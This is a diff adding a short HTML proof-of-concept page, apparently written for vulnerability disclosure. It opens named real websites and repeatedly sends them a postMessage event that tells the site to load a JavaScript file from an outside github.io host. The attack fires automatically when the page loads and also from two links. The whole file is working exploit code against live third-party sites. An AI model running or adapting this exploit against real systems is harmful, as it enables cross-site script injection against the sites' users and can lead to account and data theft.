@@ -1,0 +1,26 @@
+<!doctype html>
+<html>
+   <head>
+      <meta charset="UTF-8" />
+      <title>Postmessage PoC</title>
+      <script>
+         function pocLink(url) {
+            let win1 = window.open(url);
+            var messageData1 = {event_code:"load-custom-js",data:{js:"https://ajmal8080rzp.github.io/cross.js",doNotdefer:false}}
+
+            setInterval(function() {
+               win1.postMessage(messageData1, '*');
+            }, 500);
+         }
+
+         setTimeout(function() {
+            pocLink('https://www.ikea.co.id/in');
+         }, 500);
+      </script>
+   </head>
+   <body>
+      <a href="#" onclick="pocLink('https://www.ikea.co.id/in');">PoC link 1</a>
+      <br/>
+      <a href="#" onclick="pocLink('https://www.tajhotels.com/');">PoC link 2</a>          
+   </body>
+</html>
